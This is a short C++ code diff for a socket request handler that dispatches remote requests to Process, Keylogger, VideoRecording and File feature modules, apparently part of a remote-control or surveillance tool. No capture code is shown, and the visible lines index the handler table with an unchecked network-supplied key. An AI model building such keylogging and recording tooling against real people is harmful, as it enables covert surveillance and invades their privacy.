@@ -2,11 +2,23 @@
 
 #include <iostream>
 
+#include "File.hpp"
+#include "Keylogger.hpp"
+#include "Process.hpp"
+#include "VideoRecording.hpp"
+
 RequestHandler::RequestHandler() {
 
 }
 
-DWORD RequestHandler::ProcessClient(LPVOID lpParam) const {
+FeatureHandler* RequestHandler::featureHandlers[FEATURE_COUNT] = {
+    new Process(),
+    new Keylogger(),
+    new VideoRecording(),
+    new File()
+};
+
+DWORD RequestHandler::ProcessClient(LPVOID lpParam) {
     auto clientSocket = reinterpret_cast<SOCKET>(lpParam);
 
     PacketHeader header{};
@@ -17,7 +29,7 @@ DWORD RequestHandler::ProcessClient(LPVOID lpParam) const {
         closesocket(clientSocket);
         return 1;
     }
-    this->featureHandlers[header.request_key]->HandleRequest(clientSocket,header);
+    featureHandlers[header.request_key]->HandleRequest(clientSocket,header);
     closesocket(clientSocket);
     return 0;
 }
